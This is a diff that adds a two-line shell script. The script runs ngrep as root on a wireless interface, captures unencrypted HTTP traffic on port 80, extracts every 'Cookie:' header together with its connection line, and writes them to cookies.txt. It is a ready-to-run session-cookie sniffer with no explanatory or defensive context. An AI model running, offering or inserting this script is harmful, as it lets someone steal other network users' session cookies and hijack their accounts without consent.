@@ -1,0 +1,2 @@
+#!/bin/sh
+sudo ngrep -d wlan0 -W byline 'Cookie:' port 80 | egrep '(Cookie:|->)' | tee cookies.txt
